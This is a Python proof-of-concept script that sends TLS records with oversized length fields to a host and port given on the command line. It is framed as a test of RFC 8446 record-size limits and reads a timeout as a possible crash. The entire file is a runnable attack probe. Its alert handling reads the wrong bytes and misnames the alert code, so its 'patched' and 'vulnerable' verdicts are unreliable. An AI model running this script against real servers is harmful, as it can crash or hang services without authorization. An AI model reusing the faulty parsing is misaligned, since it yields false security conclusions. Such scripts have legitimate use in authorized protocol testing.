#!/usr/bin/env python3
import socket
import struct
import sys

# Constants from RFC 8446
TLS_CONTENT_TYPE_HANDSHAKE = 22
TLS_CONTENT_TYPE_APPLICATION_DATA = 23
TLS_VERSION_1_2 = 0x0303
TLS_VERSION_1_0 = 0x0301
MAX_PLAINTEXT_LENGTH = 2**14  # 16384 bytes
MAX_CIPHERTEXT_LENGTH = 2**14 + 256  # 16640 bytes

def craft_tls_plaintext_record(content_type, length, fragment):
    """
    Crafts a TLSPlaintext record as per RFC 8446 Section 5.1.
    struct {
        ContentType type;
        ProtocolVersion legacy_record_version;
        uint16 length;
        opaque fragment[TLSPlaintext.length];
    } TLSPlaintext;
    """
    # Type: 1 byte
    # Legacy Record Version: 2 bytes
    # Length: 2 bytes (network byte order)
    # Fragment: variable length
    header = struct.pack('!BHH', content_type, TLS_VERSION_1_2, length)
    return header + fragment

def send_overflow_record(target_host, target_port, record_type, malicious_length):
    """
    Sends a crafted TLS record with a malicious length field to the target.
    """
    print(f"[*] Connecting to {target_host}:{target_port}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_host, target_port))
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return

    print(f"[*] Crafting {record_type} record with malicious length: {malicious_length} bytes...")
    
    # For demonstration, we send a fragment smaller than the claimed length.
    # The vulnerability lies in the receiver allocating memory based on the length field
    # before validating it against the maximum allowed size.
    # We use a small fragment to avoid network timeouts, but claim a huge length.
    actual_fragment_size = 100
    fragment = b'\x00' * actual_fragment_size
    
    # Craft the record
    if record_type == "plaintext":
        # TLSPlaintext record
        record = craft_tls_plaintext_record(TLS_CONTENT_TYPE_HANDSHAKE, malicious_length, fragment)
    elif record_type == "ciphertext":
        # TLSCiphertext record (outer type is always application_data = 23)
        record = craft_tls_plaintext_record(TLS_CONTENT_TYPE_APPLICATION_DATA, malicious_length, fragment)
    else:
        print("[!] Invalid record type specified.")
        sock.close()
        return

    print(f"[*] Sending record (actual size: {len(record)} bytes, claimed length: {malicious_length} bytes)...")
    try:
        sock.sendall(record)
        print("[*] Record sent. Waiting for response or timeout...")
        
        # Try to receive any response
        try:
            response = sock.recv(1024)
            if response:
                print(f"[+] Received response: {response.hex()}")
                # Check for TLS Alert
                if len(response) >= 2 and response[0] == 21: # Alert content type
                    alert_level = response[1]
                    alert_description = response[2] if len(response) > 2 else 0
                    print(f"[+] TLS Alert received: Level={alert_level}, Description={alert_description}")
                    if alert_description == 0: # record_overflow alert
                        print("[+] Server correctly sent 'record_overflow' alert. (Patched/Compliant)")
                    else:
                        print(f"[+] Server sent other alert: {alert_description}")
                else:
                    print("[+] Server sent non-alert data. Behavior unclear.")
            else:
                print("[+] Connection closed by server without response.")
        except socket.timeout:
            print("[+] No response received within timeout. Server might be stuck or crashed. (Potentially Vulnerable)")
        except Exception as e:
            print(f"[!] Error receiving response: {e}")
            
    except Exception as e:
        print(f"[!] Error sending record: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python poc_record_layer_overflow.py <target_host> <target_port>")
        print("Example: python poc_record_layer_overflow.py 127.0.0.1 4433")
        sys.exit(1)

    target_host = sys.argv[1]
    target_port = int(sys.argv[2])

    print("=== TLS 1.3 Record Layer Overflow PoC ===")
    print(f"RFC 8446 Section 5.1: Max TLSPlaintext length = {MAX_PLAINTEXT_LENGTH} bytes")
    print(f"RFC 8446 Section 5.2: Max TLSCiphertext length = {MAX_CIPHERTEXT_LENGTH} bytes")
    print("=" * 50)

    # Test 1: Plaintext Overflow
    print("\n[Test 1] Sending oversized TLSPlaintext record...")
    # Claim length just above the limit
    malicious_plaintext_length = MAX_PLAINTEXT_LENGTH + 1
    send_overflow_record(target_host, target_port, "plaintext", malicious_plaintext_length)

    # Test 2: Ciphertext Overflow
    print("\n[Test 2] Sending oversized TLSCiphertext record...")
    # Claim length just above the limit
    malicious_ciphertext_length = MAX_CIPHERTEXT_LENGTH + 1
    send_overflow_record(target_host, target_port, "ciphertext", malicious_ciphertext_length)

    print("\n[*] PoC execution complete.")